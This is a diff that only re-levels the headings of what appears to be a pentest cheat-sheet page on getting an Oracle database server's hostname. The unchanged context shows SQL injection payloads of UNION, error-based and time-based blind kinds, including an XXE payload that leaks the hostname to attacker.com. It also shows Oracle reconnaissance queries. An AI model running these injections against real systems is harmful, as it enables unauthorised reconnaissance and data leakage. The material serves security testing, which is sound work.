@@ -7,11 +7,9 @@ tags: ["hostname", "enumeration", "system information"]
 lastUpdated: 2025-03-15
 ---
 
-## Server Hostname
-
 Determining the hostname of an Oracle database server can provide valuable information about the network infrastructure and assist in mapping the target environment. This information is often useful for lateral movement in more complex environments.
 
-### Basic Hostname Queries
+## Basic Hostname Queries
 
 Oracle provides several system views and functions to obtain hostname information:
 
@@ -22,7 +20,7 @@ Oracle provides several system views and functions to obtain hostname informatio
 | `v$instance.HOST_NAME`                  | Instance hostname from v$instance view | oracle-prod-db01              |
 | `sys.GV_$INSTANCE`                      | Host information in RAC environments   | Multiple hostnames in cluster |
 
-### Standard Hostname Queries
+## Standard Hostname Queries
 
 ```sql
 -- Most common method
@@ -35,9 +33,9 @@ SELECT HOST_NAME FROM v$instance
 SELECT INSTANCE_NAME, HOST_NAME, STATUS, DATABASE_STATUS FROM v$instance
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### UNION-Based Hostname Extraction
+### UNION-Based Hostname Extraction
 
 ```sql
 -- Basic UNION attack
@@ -47,7 +45,7 @@ SELECT INSTANCE_NAME, HOST_NAME, STATUS, DATABASE_STATUS FROM v$instance
 ' UNION SELECT NULL,HOST_NAME,NULL,NULL FROM v$instance--
 ```
 
-#### Error-Based Hostname Extraction
+### Error-Based Hostname Extraction
 
 ```sql
 -- Using error messages to extract hostname
@@ -57,7 +55,7 @@ SELECT INSTANCE_NAME, HOST_NAME, STATUS, DATABASE_STATUS FROM v$instance
 ' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT HOST_NAME FROM v$instance)||'.attacker.com/"> %remote;]>'),'/l') FROM dual) IS NOT NULL--
 ```
 
-#### Blind Hostname Extraction
+### Blind Hostname Extraction
 
 For blind SQL injection scenarios, character-by-character extraction:
 
@@ -73,7 +71,7 @@ For time-based blind:
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT HOST_NAME FROM v$instance),1,1))=111 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Domain Information
+## Domain Information
 
 In addition to hostname, you can also extract domain information:
 
@@ -85,7 +83,7 @@ SELECT SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual
 SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST')||'.'||SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual
 ```
 
-### Network Interface Information
+## Network Interface Information
 
 Oracle can also reveal information about network interfaces:
 
@@ -97,7 +95,7 @@ SELECT HOST_NAME, IP_ADDRESS FROM v$instance_ip_listener
 SELECT HOST, PORT, STATUS FROM v$listener_network
 ```
 
-### Environment Details
+## Environment Details
 
 For more comprehensive environment information:
 
@@ -110,7 +108,7 @@ SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST') as hostname,
 FROM dual
 ```
 
-### Using UTL_INADDR Package
+## Using UTL_INADDR Package
 
 The UTL_INADDR package can provide network resolution capabilities:
 
@@ -122,7 +120,7 @@ SELECT UTL_INADDR.GET_HOST_NAME FROM dual
 SELECT UTL_INADDR.GET_HOST_ADDRESS('internal-hostname') FROM dual
 ```
 
-### Global Database Name
+## Global Database Name
 
 The global database name combines the database name with the domain:
 
